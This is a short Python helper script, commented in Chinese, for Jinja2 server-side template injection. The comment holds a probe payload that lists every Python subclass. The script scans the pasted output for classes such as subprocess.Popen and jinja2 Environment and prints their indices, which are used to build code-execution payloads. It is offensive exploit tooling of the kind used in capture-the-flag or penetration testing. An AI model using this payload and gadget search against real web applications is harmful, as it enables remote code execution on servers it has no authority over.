import re
# 这里填输入 {{[].__class__.__base__.__subclasses__()}} 之后看到的全部类
a=''' '''
count=-1
a=a.split('<class')
classes="logging.Filterer,logging.Filter,jinja2.environment.Environment,jinja2.environment.TemplateModule,jinja2.environment.TemplateExpression,jinja2.environment.TemplateStream,logging.LogRecord,logging.PercentStyle,logging.Formatter,logging.BufferingFormatter,logging.PlaceHolder,logging.Manager,logging.LoggerAdapter,subprocess.CompletedProcess,subprocess.Popen,ssl.SSLObject,inspect.BlockFinder,inspect.Parameter,inspect.BoundArguments,inspect.Signature,asyncio.coroutines.CoroWrapper,asyncio.events.Handle,mimetypes.MimeTypes,uuid.UUID,click._compat._FixupStream"

classes=classes.split(',')
pattern=""
for b in a:
    count=count+1
    for pattern in classes:
        if(re.search(pattern, b)):
            print (count)
            print (b)
            print ("")
